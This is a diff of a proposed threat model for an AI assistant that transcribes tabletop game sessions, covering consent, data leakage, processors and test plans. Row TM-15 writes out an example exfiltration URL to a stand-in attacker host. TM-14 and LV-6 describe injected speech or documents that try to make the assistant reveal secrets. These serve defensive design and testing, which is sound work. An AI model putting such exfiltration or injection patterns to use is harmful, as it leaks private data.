@@ -3,8 +3,8 @@
 Status: **PROPOSED — for the owner's acceptance. Not accepted.** Nothing here binds a
 bead until the owner accepts it in writing (section 13); until then it is the working
 default that the Phase 0 gate (`1ir.13.1`) reviews. · Bead:
-`agent-forge-harness-1ir.1.3` · Date: 2026-09-29 · Independent review: **pending**
-(section 14)
+`agent-forge-harness-1ir.1.3` · Date: 2026-09-29 · Independent review: **done** — FAIL
+at `d31677e`, cleared at `89044be`; its deferred findings are fixed here (section 14.2)
 
 Refines: the research draft
 [`../forge/research/live-session-assistant-threat-model.md`](../forge/research/live-session-assistant-threat-model.md)
@@ -101,7 +101,7 @@ web-fallback path (`xiu.1.3`); the legal analysis (`1ir.1.4`); pricing (`1ir.1.9
 | The data-flow diagram covers microphone, vendor, transcript store, GM path, projector and player slots | Section 5.2 | Met in the draft |
 | Client-side fetch exfiltration is covered | TM-15, TM-42, LS-9, LS-21, LV-9 | Met in the draft |
 | Background-worker authorization contexts are covered | Section 6.7, section 8.2, TM-36, TM-37, LV-4 | Met in the draft |
-| The model is reviewed by someone other than its author | Section 14.2 | **Pending** |
+| The model is reviewed by someone other than its author | Section 14.2 | Met: the review and its verification are recorded there |
 | Residual risks are accepted in writing by the owner | Sections 10 and 13 | **Pending** |
 | The design comment of 2026-09-18: adopt SEC-7 or say why a CSRF token is needed; one register of provider terms with SEC-39 | LS-2, LS-16 | Met in the draft: SEC-7 is adopted and no token is needed; one register |
 
@@ -274,7 +274,7 @@ space into player space is TB6, and it carries references, never text (LS-23).
 
 | ID | Rule | Basis |
 | --- | --- | --- |
-| LS-16 | **One register of processor terms serves the Workbench and the assistant** (the design comment of 2026-09-18). SEC-39's allowlist and this register are the same record, kept beside the model catalogue: for each processor, the terms that matter — no training on API data, retention bound, human review, region, subprocessors, deletion API, the opt-out flags applied to our account (for example `mip_opt_out`) — the date they were checked, and **the data classes it may receive**: GM-private documents, speech audio, transcript text, scene glossaries. Routing refuses on the server any call whose processor is not on the register for that data class, whatever a request, a fallback chain or a routing profile says. Adding a processor, or a data class to one, is an amendment to this record and the Workbench's. Which processors start on it is `1ir.1.5`'s, against plan section 6.10's minimum. | W (SEC-39) + P · **E** (with S-5) |
+| LS-16 | **One register of processor terms serves the Workbench and the assistant** (the design comment of 2026-09-18). SEC-39's allowlist and this register are the same record, kept beside the model catalogue: for each processor, the terms that matter — no training on API data, retention bound, human review, region, subprocessors, deletion API, the opt-out flags applied to our account (for example `mip_opt_out`) — the date they were checked, and **the data classes it may receive**: GM-private documents, speech audio, transcript text, scene glossaries. Routing refuses on the server any call whose processor is not on the register for that data class, whatever a request, a fallback chain or a routing profile says. Adding a processor, or a data class to one, is an amendment to this record and the Workbench's. Which processors start on it is `1ir.1.5`'s, against the research draft's section 6.10 minimum. | W (SEC-39) + P · **E** (with S-5) |
 | LS-17 | **Each request carries the least it can.** No account id, alias, display name or email; a scene glossary from one campaign, bounded (*suggested* 50 terms) and refreshed per scene; only **released** text (LS-13); candidates as identifiers and names; no identity link unless the call is a GM-path call to a processor registered for GM-private documents. | P (plan section 5.5) + I |
 | LS-18 | **No processor credential ever reaches a browser, and audio never goes from a browser to a processor directly** until this record is amended. Plan section 5.12's Phase 5 hybrid session may be proposed by `1ir.12.6` only with all of: a session the **server can terminate**, so a pause is enforced by hanging up; a single-use token bound to one window and no longer-lived than it; `connect-src` widened for exactly that host, on the capture document only (LS-9); transcripts returned to the server; the processor on the register for speech audio; and an amendment here that re-rates TM-38. | P (plan section 5.12) + I · **E** (LQ-7) |
 | LS-19 | **The product never names a model or a provider (D-9); what the in-product consent notice says about processors is counsel's.** In-product copy describes the processing — speech is sent to speech-to-text and AI service providers that may not train on it or keep it beyond a stated bound — and never a model name or id, nor a provider's. D-9's own row already settles the privacy notice: it still names the processor. If counsel requires the in-product consent notice to name processors as well, the owner decides how D-9 reads for it (LQ-4). A material change — a new processor, a longer retention, a new capability — bumps the disclosure version and asks everyone again (research draft section 6.1, item 8). | P (D-9) · **E** (LQ-4) · **L** (CQ-3) |
@@ -319,7 +319,7 @@ it, is never the authority it may use.
 | --- | --- | --- |
 | LS-34 | **A safety signal is authorised by its principal and then forgets it.** With accounts the server knows who sends each request, so anonymity is now a server rule, not an absence of data. The GM's notice carries the signal's kind and time only. **No row, log line, trace, metric label, audit row or error ever holds a principal together with a signal.** The rate counter is keyed by an HMAC of the principal under a key rotated per table session and held in memory or in a counter row that names no principal. Every signal kind uses one route path and one response, with the kind in the body, so a platform request log shows only that a table write happened. The pause a signal causes is recorded with no actor. | P (P11) + I |
 | LS-35 | **Consent evidence is per account, append-only, and seen by few.** Each record holds the account, the session, the disclosure version, the choice, the age attestation and the time — nothing else. The account reads its own history; the GM sees counts (LS-6); operators read records only under a documented legal process. Records are tombstoned, not deleted, with the campaign, for the period counsel sets. | P (plan section 3.12) · **L** (CQ-4) |
-| LS-36 | **A deletion request is made by an account, from its account, and authorised by its own consent.** An account that recorded a Yes in a session may ask to delete that session's transcripts from its account area — **even after its seat is removed**, because the right follows the consent, not the seat. There is no unauthenticated deletion page and no deletion code (LQ-2). Because speech is never attributed to a speaker, a request deletes **the whole session's transcripts and everything derived from them** (RR-14). Answers are uniform whether or not anything was deleted. A person without an account asks through support (CQ-5). | P (plan section 3.12) + I · **E** (LQ-2, LQ-9) · **L** (CQ-5) |
+| LS-36 | **A deletion request is made by an account, from its account, and authorised by its own consent.** An account that recorded a Yes in a session may ask to delete that session's transcripts from its account area — **even after its seat is removed**, because the product's deletion permission follows the consent, not the seat. There is no unauthenticated deletion page and no deletion code (LQ-2). Because speech is never attributed to a speaker, a request deletes **the whole session's transcripts and everything derived from them** (RR-14). Answers are uniform whether or not anything was deleted. A person without an account asks through support (CQ-5). | P (plan section 3.12) + I · **E** (LQ-2, LQ-9) · **L** (CQ-5) |
 | LS-37 | **A screen is a room.** A screen grant never records a consent and never requests deletion. **Whether it may also pause and signal is the owner's (LQ-10).** Anyone standing at it may need to (B9), but SEC-48 entitles a screen to the table slot, audio tap and mute and its presence heartbeat and nothing else, D-13 decided a view-only screen, and Workbench section 15.6 answers every other screen call with *no such route*: a screen's pause and signal would widen an accepted rule, not carry one. **Default in force: SEC-48 as accepted — a screen has no pause and no signal route**; the people in the room pause and signal from their own accounts, which everyone counted holds (LS-6, LQ-3). If the owner answers Yes, SEC-48 and section 15.6 are amended first (section 15.3); the screen's limits are then keyed by the grant (SEC-47), and LS-7 means its pause is never refused. | W (SEC-48, D-13) + I · **E** (LQ-10) |
 
 ### 6.9 Telemetry and errors
@@ -351,7 +351,7 @@ section 9; *Owners* the beads that build the controls.
 
 | ID | Threat | Boundary | STRIDE / LINDDUN | L/I | Controls | Verified by | Owners | Residual |
 | --- | --- | --- | --- | --- | --- | --- | --- | --- |
-| TM-01 | **A GM-only, unclassified or ineligible field reaches a player** through a mixed chunk, the wrong namespace, a template bug, a model echo, or a display composed from a stale projection | TB6, TB7, TB8 | I / Data disclosure | M/H | LS-23 to LS-27; field-granular chunks; one builder (SEC-14); ED-9's preconditions; version pinning (ED-6); roles and forced RLS (`1ir.1.13`); the egress filter | LV-1, LV-2, LV-3, LV-5, LV-10, LV-11, LV-24 | `1ir.2.3`, `1ir.2.4`, `1ir.11.1`, `1ir.11.5`, `1ir.13.6` | Low |
+| TM-01 | **A GM-only, unclassified or ineligible field reaches a player** through a mixed chunk, the wrong namespace, a template bug, a model echo, or a display composed from a stale projection | TB6, TB7, TB8 | I / Data disclosure | M/H | LS-23 to LS-27; field-granular chunks; one builder (SEC-14); ED-9's preconditions; version pinning (ED-6); roles and forced RLS (`1ir.1.13`); the egress filter | LV-1, LV-2, LV-3, LV-5, LV-10, LV-11, LV-24, LV-34 | `1ir.2.3`, `1ir.2.4`, `1ir.11.1`, `1ir.11.5`, `1ir.13.6` | Low |
 | TM-02 | **Cross-user, cross-player or cross-campaign leakage**: cache keys that mix id spaces; an entity index collision; an RLS bypass by an owner, superuser or `BYPASSRLS` role; settings inherited across pooled connections or across recipients in one worker; a glossary mixing campaigns | TB4 to TB11 | I / Linking, Data disclosure | M/H | The campaign in every key and predicate; typed principal fingerprints (plan section 4.7); roles that own nothing and are `NOSUPERUSER NOBYPASSRLS`; LS-30; LS-17 | LV-2, LV-3, LV-4, LV-24 | `1ir.1.13`, `1ir.2.3`, `1ir.2.5`, `1ir.4.3` | Low |
 | TM-04 | **A secret is inferred rather than shown**: the resolver maps "the stranger" to a hidden identity; one portrait on persona and true identity; card counts or ordering; a `403` against a `404`; frame timing correlated with a GM-only trigger | TB5, TB8, TB9 | I / Linking, Detecting | M/H | A player-space resolver over eligible aliases only (`1ir.12.2`); persona entities and the portrait-reuse warning (`1ir.5.5`); uniform answers (SEC-46); no frame from a GM-only trigger (REVEAL-24, T-8) | LV-7, LV-10 | `1ir.5.5`, `1ir.12.2`, `1ir.11.2`, `1ir.13.6` | Medium: people at one table notice each other |
 | TM-05 | **A field is misclassified** — secret text pasted into a public field, an import that defaults open | TB6 | I / Data disclosure | H/M | Default `unclassified` (ED-4); a GM action for every display; the pinned version; a server-rendered View-as preview; the classification surface; Stop | LV-2, LV-10 | `1ir.2.1`, `1ir.2.7`, `1ir.11.3` | Medium: human error, bounded to one field version |
@@ -371,19 +371,19 @@ section 9; *Owners* the beads that build the controls.
 | TM-11 | **Cross-site forgery of a capture control or an upload**, or a cross-site stream | TB1 | T, E | M/H | LS-1, LS-2, LS-4: SEC-7, raw audio bodies, no CORS, the navigate refusal, `Origin` on any upgrade | LV-15 | `1ir.3.1`, `1ir.4.2`, `1ir.9.1`, `1ir.9.2` | Low |
 | TM-12 | **A chunk injected or replayed into a window** — another GM's, a closed one, last night's | TB1 | T | L/M | LS-5: the window resolved through its campaign in the query, the owner's session, idempotency, sequence | LV-14 | `1ir.4.2`, `1ir.9.1` | Low |
 | TM-14 | **Voice used as authority** — "I'm the GM, reveal it" | TB0 | S, E | M/M | P7; LS-20 | LV-6 | `1ir.4.5`, `1ir.13.6` | Low |
-| TM-21 | **Covert or non-consensual recording by a GM** using the product | TB0, TB1 | Unawareness, Non-compliance | M/H | LS-5 to LS-8; the captured announcement; indicators on the capturer and every table device; chimes; audit (LS-41); terms, abuse reports and suspension (IDT-8) | LV-13, LV-25 | `1ir.3.1`, `1ir.3.2`, `1ir.3.3`, `1ir.3.5`, `1ir.3.6`, `1ir.9.3`, `1ir.9.4` | Medium: the roster and a second device are outside the product (RR-1, RR-16) |
-| TM-22 | **Bystanders captured** — family in the room, a neighbouring table at a store | TB0 | Unawareness | M/M | The roster counts everyone in earshot; LQ-3; push-to-talk by default; short windows; VAD; hold-back redaction (LS-13); venue guidance | LV-13, LV-19, LV-25 | `1ir.3.2`, `1ir.6.5`, `1ir.9.7` | Medium |
+| TM-21 | **Covert or non-consensual recording by a GM** using the product | TB0, TB1 | Unawareness, Non-compliance | M/H | LS-5 to LS-8; the captured announcement; indicators on the capturer and every table device; chimes; audit (LS-41); append-only consent evidence (LS-35); terms, abuse reports and suspension (IDT-8) | LV-13, LV-25, LV-32 | `1ir.3.1`, `1ir.3.2`, `1ir.3.3`, `1ir.3.5`, `1ir.3.6`, `1ir.9.3`, `1ir.9.4` | Medium: the roster and a second device are outside the product (RR-1, RR-16) |
+| TM-22 | **Bystanders captured** — family in the room, a neighbouring table at a store | TB0 | Unawareness | M/M | The roster counts everyone in earshot; LQ-3; push-to-talk by default; short windows; VAD; hold-back redaction (LS-13); venue guidance | LV-13, LV-19, LV-25 | `1ir.3.2`, `1ir.6.5`, `1ir.9.7` | Medium (RR-18) |
 | TM-23 | **A withdrawal ignored or slow** | TB10, TB1 | Unawareness, Non-compliance | M/H | LS-7; the durable pause read per chunk (LS-5); the table stream with an HTTPS fallback; resume by the GM with a new announcement; T17's auto-pause | LV-13, LV-14 | `1ir.3.6`, `1ir.9.4`, `1ir.9.5`, `1ir.9.9` | Low |
 | TM-24 | **Voice treated as a biometric** — speaker identification, voiceprints | TB2 | Identifying, Non-compliance | L/H | Voiceprints are a non-goal; diarization legal-gated (`1ir.12.4`); identification features off at every processor (LS-16) | LV-22, LV-25 | `1ir.1.4.2`, `1ir.12.4` | Low |
 | TM-25 | **Emotion, age or health inference creeps in** | TB2, TB3 | Identifying, Non-compliance | L/H | Explicit exclusions; phrase-only safety detection that only quiets the assistant; no tone features; design review at each gate | LV-19, LV-23 | `1ir.9.9`, `1ir.10.5`, `1ir.13.4` | Low |
 | TM-26 | **Minors recorded** | TB0 | Non-compliance | M/H | LS-8 | LV-30, LV-25 | `1ir.1.4.3`, `1ir.1.8`, `1ir.3.1`, `1ir.3.5` | Medium: age is self-attested (RR-2) |
 | TM-27 | **Harassment with transcripts, or griefing with pause and signals** | TB5, TB10 | Non-repudiation | M/M | GM-only, short-lived transcripts with export warnings; no speaker attribution; LS-7 (the effect is never refused; notices are bounded); Remove; abuse reports | LV-13 | `1ir.6.4`, `1ir.9.4`, `1ir.9.9` | Medium |
-| TM-28 | **A transcript error harms someone** — a misheard word attributed to a player; a defamatory recap | TB5 | Non-repudiation | M/M | Evidence labels (P6); no attribution; GM correction; recaps are GM-approved drafts | LV-23 | `1ir.4.4`, `1ir.10.7` | Low–Medium |
+| TM-28 | **A transcript error harms someone** — a misheard word attributed to a player; a defamatory recap | TB5 | Non-repudiation | M/M | Evidence labels (P6); no attribution; GM correction; recaps are GM-approved drafts | LV-23 | `1ir.4.4`, `1ir.10.7` | Low–Medium (RR-20) |
 | TM-31 | **A safety signal is traced to its sender** — by the GM from timing or presence; by an operator from logs, rows or metrics now that every sender is an account | TB10, TB12 | Linking, Identifying | M/M | LS-34; LS-38 | LV-12, LV-26 | `1ir.9.9`, `1ir.6.3` | Medium: people see who taps a phone (RR-5) |
 | TM-33 | **A table-device write is forged** — a hostile page records a Yes, a pause, a withdrawal or a signal in a player's name | TB10 | T | M/M | LS-3: SEC-45's Fetch Metadata refusal, SEC-7, `table_principal`, no side-effecting `GET` | LV-15 | `1ir.3.2`, `1ir.3.6`, `1ir.9.4`, `1ir.9.9` | Low |
-| TM-35 | **Consent inflation**: Yes answers from accounts that are not in the room — a seated player watching from home, a stranger who accepted a mistyped offer (WT-28), a shared login counted twice — make the roster check pass while a person present has not agreed | TB10 | Unawareness, Non-compliance | M/H | LS-6: distinct accounts only; only the owner and confirmed seats count toward the roster; an unconfirmed seat's Yes never counts, while its silence still blocks; a screen never consents; the GM sees the count against the roster in the pre-flight | LV-13 | `1ir.3.1`, `1ir.3.5`, `1ir.9.4`, `1ir.9.7` | Medium: the product cannot see who is in the room (RR-1) |
+| TM-35 | **Consent inflation**: Yes answers from accounts that are not in the room — a seated player watching from home, a stranger who accepted a mistyped offer (WT-28), a shared login counted twice — make the roster check pass while a person present has not agreed | TB10 | Unawareness, Non-compliance | M/H | LS-6: distinct accounts only; only the owner and confirmed seats count toward the roster; an unconfirmed seat's Yes never counts, while its silence still blocks; a screen never consents (LS-37); the GM sees the count against the roster in the pre-flight | LV-13 | `1ir.3.1`, `1ir.3.5`, `1ir.9.4`, `1ir.9.7` | Medium: the product cannot see who is in the room (RR-1) |
 | TM-42 | **Covert capture by script on a capture-granted page** — injected script records while the indicator is ignored, or the microphone grant outlives the capture view inside a long-lived single-page document | TB1 | T, I / Detecting, Unawareness | L/H | LS-9 (one granting document with its own strict policy; full navigation into capture; one module owns `getUserMedia`); LS-21; `va8` (TA-1); `connect-src 'self'` (LR-3); the browser's indicator | LV-9 | `1ir.3.3`, `1ir.3.4`, `1ir.4.1` | Low once the capture document's policy ships |
-| TM-45 | **Who declined, withdrew or paused is inferred** — from presence by alias, from the count changing when one player answers, from timing | TB5, TB10 | Linking, Detecting | M/M | Counts only, never per person (LS-6); presence shows aliases, not consent state (AUDIO-21); refusal codes to the GM only; pauses recorded without an actor when they come from a signal (LS-34) | LV-13 | `1ir.3.2`, `1ir.9.7` | Medium at a small table (RR-6) |
+| TM-45 | **Who declined, withdrew or paused is inferred** — from presence by alias, from the count changing when one player answers, from timing | TB5, TB10 | Linking, Detecting | M/M | Counts only, never per person (LS-6); presence shows aliases, not consent state (AUDIO-21); refusal codes to the GM only; pauses recorded without an actor when they come from a signal (LS-34); consent records seen by few (LS-35) | LV-13, LV-32 | `1ir.3.2`, `1ir.9.7` | Medium at a small table (RR-6) |
 
 ### 7.3 Processors and storage (TB2, TB3, TB4)
 
@@ -391,9 +391,9 @@ section 9; *Owners* the beads that build the controls.
 | --- | --- | --- | --- | --- | --- | --- | --- | --- |
 | TM-08 | **A log, trace or error leaks a transcript or a prompt** — an exception string, a traced prompt (LR-4), an error report, an operator browsing rows | TB12, TB4 | I / Data disclosure | H/H | LS-22, LS-38, LS-39; LS-11; SEC-20 to SEC-24; 30-day log retention | LV-1, LV-12, LV-16 | `1ir.6.3`, `1ir.6.1` | Low |
 | TM-16 | **An insider reads transcripts** | TB4 | I | L/H | LS-11: application encryption, KMS separation of duties, audited break-glass; no support tooling that shows content | LV-12, LV-17 | `1ir.6.1`, `1ir.1.13` | Low |
-| TM-19 | **Backups keep deleted transcripts** | TB4 | I / Non-compliance | M/M | Crypto-shredding (LS-11); the backup window for unencrypted rows documented | LV-17 | `1ir.6.1`, `1ir.6.2` | Low |
+| TM-19 | **Backups keep deleted transcripts** | TB4 | I / Non-compliance | M/M | Crypto-shredding (LS-11, LS-40); the backup window for unencrypted rows documented | LV-17, LV-33 | `1ir.6.1`, `1ir.6.2` | Low |
 | TM-29 | **A processor retains, trains on or leaks** audio or text | TB2, TB3 | Data disclosure, Non-compliance | M/H | LS-16, LS-17; DPAs; opt-out flags applied; region; per-processor kill switch (LS-42) | LV-22, LV-25 | `1ir.1.5`, `1ir.4.3` | Medium: a third party (RR-8) |
-| TM-30 | **A person cannot exercise their rights** — a speaker without an account, a player whose seat was removed, a request that cannot be verified | TB10 | Non-compliance | M/M | LS-36: deletion by consent, not by seat; support for people without accounts; short retention | LV-20, LV-25 | `1ir.1.4.4`, `1ir.6.2`, `1ir.6.4` | Medium until counsel answers CQ-5 |
+| TM-30 | **A person cannot exercise their rights** — a speaker without an account, a player whose seat was removed, a request that cannot be verified | TB10 | Non-compliance | M/M | LS-36: deletion by consent, not by seat; support for people without accounts; short retention; LS-40: deletion reaches every copy | LV-20, LV-25, LV-33 | `1ir.1.4.4`, `1ir.6.2`, `1ir.6.4` | Medium until counsel answers CQ-5 |
 | TM-34 | **Speech around a safety phrase or out-of-game talk is processed before detection** | TB2, TB3, TB4 | Unawareness, Non-compliance | M/M | LS-13; processors that retain nothing (LS-16) | LV-19 | `1ir.6.5`, `1ir.9.5`, `1ir.10.5`, `1ir.1.5` | Medium: the speech-to-text processor always hears it (RR-7) |
 | TM-38 | **A browser-to-processor path** (plan section 5.12's Phase 5 option) bypasses the server's per-chunk preconditions, keeps listening through a pause, or leaks a processor token | TB1, TB2 | S, T, E / Non-compliance | M/H if built | LS-18: not built until amended, and then only server-terminable, single-use, window-bound | LV-23 at `1ir.12.6`; LV-9 | `1ir.12.5`, `1ir.12.6` | Low while not built |
 | TM-39 | **People are not told who processes their speech** — D-9 keeps providers off every product surface, a processor's terms change after it was checked, or a processor is added without a new consent | TB2, TB3 | Unawareness, Non-compliance | M/M | LS-16 (terms and dates in one register); LS-19 (a material change bumps the disclosure version) | LV-22, LV-25 | `1ir.1.5`, `1ir.1.8`, `1ir.13.12` | Medium until CQ-3 and LQ-4 are answered |
@@ -405,13 +405,13 @@ section 9; *Owners* the beads that build the controls.
 
 | ID | Threat | Boundary | STRIDE / LINDDUN | L/I | Controls | Verified by | Owners | Residual |
 | --- | --- | --- | --- | --- | --- | --- | --- | --- |
-| TM-13 | **Denial of wallet** — scripted capture, parallel windows, huge uploads, a stolen GM cookie capturing in a loop | TB1, TB2, TB3 | D | M/M | X-1; LS-42: reservations in the durable ledger, body bounds while streaming, one window per session, allowances, kill switches | LV-14, LV-21 | `1ir.8.2`, `1ir.8.4`, `yje.5.2` | Low–Medium until `yje.5.2`'s reservation exists (LR-15) |
+| TM-13 | **Denial of wallet** — scripted capture, parallel windows, huge uploads, a stolen GM cookie capturing in a loop | TB1, TB2, TB3 | D | M/M | X-1; LS-42: reservations in the durable ledger, body bounds while streaming, one window per session, allowances, kill switches | LV-14, LV-21 | `1ir.8.2`, `1ir.8.4`, `yje.5.2` | Low–Medium until `yje.5.2`'s reservation exists (LR-15, RR-19) |
 | TM-15 | **Exfiltration through rendered output or client code** — injected text makes the GM's or a table browser fetch `https://attacker/?d=<secret>` through an image, `srcset`, CSS `url()`, a prefetch, a link preview or an analytics call | TB5, TB8, TB9 | I / Data disclosure | M/H | LS-21; LS-9; `va8` (TA-1); LR-3's policy; SEC-18; SEC-33 | LV-9 | `1ir.4.6`, `1ir.11.6`, `1ir.3.4` | Low |
 | TM-17 | **A credential is compromised** — a GM cookie reads every transcript and card for up to 14 days; a seated account's cookie reads its own slot and consent history; a screen grant copied from a screen's browser | TB1, TB5, TB10 | S, E | M/H | Short retention (LS-12); a fresh password for transcript export and bulk transcript deletion (LQ-6, SEC-40's pattern); revocable sessions (`yje.2.3`); screen grants die with their session (SEC-48) | LV-27 | `yje.2.3`, `1ir.6.4` | **Medium** until `yje.2.3` (RR-10) |
-| TM-36 | **A job acts as a confused deputy** — a handler run inside account B's request uses B's session, or a handler working through two campaigns in one transaction carries the first's settings into the second | TB11 | E, I / Linking | M/H | LS-28, LS-30, LS-31; LR-6's runner passes no principal | LV-4 | `1ir.2.3`, `1ir.11.2`, `1ir.6.2`, `1ir.1.13` | Low |
+| TM-36 | **A job acts as a confused deputy** — a handler run inside account B's request uses B's session, or a handler working through two campaigns in one transaction carries the first's settings into the second | TB11 | E, I / Linking | M/H | LS-28, LS-30, LS-31; LS-33: driving jobs grants nothing; LR-6's runner passes no principal | LV-4 | `1ir.2.3`, `1ir.11.2`, `1ir.6.2`, `1ir.1.13` | Low |
 | TM-37 | **A job acts on stale or forged authority** — a payload that says `eligible`, a delivery composed before a narrowing, a transcription job for a window a purge has covered, a job for a campaign since deleted | TB11 | T, E, I | M/H | LS-29, LS-32; RQ-4's send-time re-check; RQ-5's reconciliation | LV-4, LV-8 | `1ir.2.3`, `1ir.11.2`, `1ir.6.2`, `1ir.6.5` | Low |
 | TM-41 | **The GM's screen is shown to players** — projected, shared on a call, streamed — with transcripts, secret prompts and GM-only cards on it; or a link navigates the GM's projecting window to a transcript | TB5 | I / Data disclosure | H/M | LS-4 (no navigation to live content); secret prompts off by default (plan section 3.1); collapsed SECRET cards; a quick-hide shortcut; a presenting mode (design lane) | LV-28, LV-15 | `1ir.4.6`, `1ir.10.4`, `1ir.6.4` | Medium (RR-3) |
-| TM-46 | **Capture exhausts capacity** — clips and utterances hold request slots through slow processor calls until login and chat cannot be served (LR-12) | TB1 | D | M/M | LS-42: per-instance bound on processor calls, per-window rate bound, body bounds while streaming | LV-14, T-15 | `1ir.4.2`, `1ir.9.1`, `1ir.1.6` | Low–Medium until the load test runs with capture in it |
+| TM-46 | **Capture exhausts capacity** — clips and utterances hold request slots through slow processor calls until login and chat cannot be served (LR-12) | TB1 | D | M/M | LS-42: per-instance bound on processor calls, per-window rate bound, body bounds while streaming | LV-14, T-15 | `1ir.4.2`, `1ir.9.1`, `1ir.1.6` | Low–Medium until the load test runs with capture in it (RR-21) |
 
 ## 8. Authorization matrices
 
@@ -467,7 +467,7 @@ without a row here is not done.
 | LV-1 | **Canary leak suite for live paths** on the canary harness (LR-10): canaries in every `gm_only`, `unclassified` and other-recipient field, identity links, titles, filenames, glossary terms and **transcript text**; every sink recorded — STT and LLM fakes, embeddings, cache keys, SQL parameters, logs, metrics, traces, slot frames, HTTP bodies, exports, job payloads, audit rows — across happy paths, processor errors, timeouts, validation failures, retries and cancellations | TM-01, TM-07, TM-08, TM-40 | `1ir.13.6`, `1ir.6.3` |
 | LV-2 | **Policy oracle property tests** (LR-10) against the real database, with roles and forced RLS once they exist | TM-01, TM-02, TM-05, TM-06, TM-10 | `1ir.2.2`, `1ir.2.3`, `1ir.11.1` |
 | LV-3 | **Privilege and RLS tests** (plan section 4.11, family 5): the table reader cannot read GM tables; RLS binds owners; no role is a superuser or `BYPASSRLS`; the table writer inserts only its own rows; fingerprints are unreadable from the player path; empty settings deny; request input cannot set a setting | TM-01, TM-02, TM-32 | `1ir.1.13`, `1ir.2.3` |
-| LV-4 | **Worker-context tests**: a handler run inside another account's request never reads that request's session (a spy on the request context); two campaigns, and two recipients, processed back to back by one worker never share a setting or a row; each live job kind declares the identifier keys its payload may carry, and a payload with any other key — text, a decision such as `eligible`, a credential — is refused at enqueue (a per-kind allowlist: a named change beside `check_payload`, which checks shape only, LR-6); a job whose campaign, window, seat, eligibility or epoch changed after it was queued writes nothing; a job for a deleted campaign completes as a no-op | TM-02, TM-36, TM-37 | `1ir.2.3`, `1ir.11.2`, `1ir.6.2` |
+| LV-4 | **Worker-context tests**: a handler run inside another account's request never reads that request's session (a spy on the request context); two campaigns, and two recipients, processed back to back by one worker never share a setting or a row; each live job kind declares the identifier keys its payload may carry, and a payload with any other key — text, a decision such as `eligible`, a credential — is refused at enqueue (a per-kind allowlist: a named change beside `check_payload`, which checks shape only, LR-6); a job whose campaign, window, seat, eligibility or epoch changed after it was queued writes nothing; a job for a deleted campaign completes as a no-op; `POST /internal/jobs` keeps the guarantees `service/tests/test_job_driver.py` pins today — no route without the secret, a constant-time comparison, nothing that names a job or a payload (LS-33) | TM-02, TM-36, TM-37 | `1ir.2.3`, `1ir.11.2`, `1ir.6.2` |
 | LV-5 | **Import-boundary contract**: the player modules import no GM store, retriever, transcript store or card type | TM-01 | `1ir.2.3`, `1ir.13.6` |
 | LV-6 | **Injection corpus** — spoken, uploaded and document-embedded — on the GM and player paths: no share, reveal, delete, pause, resume or policy change; no out-of-registry trigger | TM-03, TM-14 | `1ir.4.5`, `1ir.13.6` |
 | LV-7 | **Inference tests**: persona resolution; portrait reuse (keys, handles, bytes); counts and ordering; `403` against `404`; autocomplete; frame timing against GM-only triggers | TM-04, TM-07, TM-09, TM-10 | `1ir.13.6` |
@@ -478,7 +478,7 @@ without a row here is not done.
 | LV-12 | **Content-free observability** across the live suite, exception paths included: every log line, span, metric label and error body searched for canaries; a tracing test with `RAG_TRACING` on finds no canary in any span; the content-trace switch refuses under `K_SERVICE` | TM-08, TM-16, TM-31, TM-40 | `1ir.6.3` |
 | LV-13 | **Consent, roster and late-joiner E2E**: each precondition refusal; late joiners (a confirmed seat, an unconfirmed seat, a second browser of one account, a screen mint); **roster counting** — an unconfirmed seat's Yes never counts, a removed seat's stops counting, a screen never consents, one account counts once; pause, withdrawal and signals from every principal; nobody learns who declined | TM-21, TM-22, TM-23, TM-27, TM-35, TM-45 | `1ir.13.7`, `1ir.3.5`, `1ir.9.4` |
 | LV-14 | **Capture admission**: every precondition re-checked per chunk; a pause taken on one instance refuses the next chunk on the other; replay across windows and sessions; another GM's window is a `404`; a chunk after the window's end; body limits enforced while streaming; the per-instance processor bound holds under a burst | TM-12, TM-13, TM-23, TM-46 | `1ir.4.2`, `1ir.3.5`, `1ir.9.1` |
-| LV-15 | **Forged requests** (T-7's pattern) for every live route family: a foreign `Origin`, `Origin: null`, `Sec-Fetch-Site: cross-site`, a form, multipart or `text/plain` body; table live routes refuse Fetch Metadata before any row is read (T-19's pattern); live streams and content `GET`s refuse `Sec-Fetch-Mode: navigate` | TM-11, TM-33, TM-41 | `1ir.3.1`, `1ir.3.6`, `1ir.4.2`, `1ir.9.1`, `1ir.9.4`, `1ir.9.9` |
+| LV-15 | **Forged requests** (T-7's pattern) for every live route family: a foreign `Origin`, `Origin: null`, `Sec-Fetch-Site: cross-site`, a form, multipart or `text/plain` body; table live routes refuse Fetch Metadata before any row is read (T-19's pattern); live streams and content `GET`s refuse `Sec-Fetch-Mode: navigate` | TM-11, TM-33, TM-41 | `1ir.3.1`, `1ir.3.6`, `1ir.4.2`, `1ir.9.1`, `1ir.9.4`, `1ir.9.9`; for their own routes `1ir.2.7`, `1ir.4.4`, `1ir.4.6`, `1ir.5.4`, `1ir.6.2`, `1ir.6.4`, `1ir.11.3` (section 15.5) |
 | LV-16 | **No audio at rest**: spies on the filesystem, the database, object storage, logs and the browser (IndexedDB, Cache Storage, `localStorage`, service-worker registrations) through push-to-talk, a window and a failure | TM-08, TM-20 | `1ir.4.1`, `1ir.4.2`, `1ir.9.1` |
 | LV-17 | **Encryption**: a segment moved to another campaign's row fails to decrypt; a destroyed data key leaves a restored copy unreadable; the key cache empties on deletion; a KMS IAM review shows no operator with decrypt | TM-16, TM-19, TM-43 | `1ir.6.1` |
 | LV-18 | **Retention**: a row past `expires_at` is never served, decrypted or sent to a model before the sweep; the sweep deletes it; the maximum is refused on write; a recording is gone after transcription and at 24 h | TM-44 | `1ir.6.2`, `1ir.10.8` |
@@ -495,6 +495,9 @@ without a row here is not done.
 | LV-29 | **Portraits**: T-9's hostile-media corpus and per-slot handles for the assistant's portrait displays | TM-09 | `1ir.5.5`, `1ir.11.4` |
 | LV-30 | **Minors**: capture refused unless every account that has answered Yes for this session — counted toward the roster or not, an unconfirmed seat's included (LS-6, LS-8) — attested the required age for this policy version; an account's age gate alone never passes | TM-26 | `1ir.3.5` |
 | LV-31 | **Feature isolation**: transcript canaries never reach `chat` tables, conversation memory, titles, web-fallback queries or the cost ledger; a lint forbids the live modules from importing the chat history store | TM-40 | `1ir.6.3`, `1ir.4.6` |
